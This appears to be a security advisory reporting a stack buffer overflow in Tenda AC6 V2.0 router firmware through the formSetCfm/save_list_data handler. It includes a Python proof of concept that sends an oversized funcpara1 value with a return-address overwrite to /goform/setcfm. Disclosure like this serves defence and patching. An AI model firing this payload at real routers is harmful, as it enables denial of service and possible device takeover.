# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "formSetCfm"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the `formSetCfm` function, when user input sets `funcname` to **`save_list_data`**, the parameters **`funcpara1`** and **`funcpara2`** are passed to the `save_list_data` function. Inside `save_list_data`, `funcpara1` is then used in a `sprintf` call: `sprintf(mib_name, "%s.list%d", list_name, counta);`. This writes to a stack variable **`mib_name`** which has a fixed size of only **64 bytes**. Crucially, there's **no length validation** performed on the input, making it very easy to cause a **buffer overflow**.

![image-20250616221546473](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250616221546473.png)

![image-20250616221617940](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250616221617940.png)

poc

```python
import requests
def send_payload(url, funcpara1, funcpara2):
    params={
            'funcname':b'save_list_data',
            'funcpara1':funcpara1,
            'funcpara2':funcpara2}
    cookie={'password':'gfytgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

funcname=b'save_list_data'
funcpara1=b'a'*0x200+b'\xef\xbe\xad\xde'
funcpara2=b''
url="http://192.168.1.1/goform/setcfm"
send_payload(url, funcpara1,funcpara2)   
```

![image-20250616225016508](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250616225016508.png)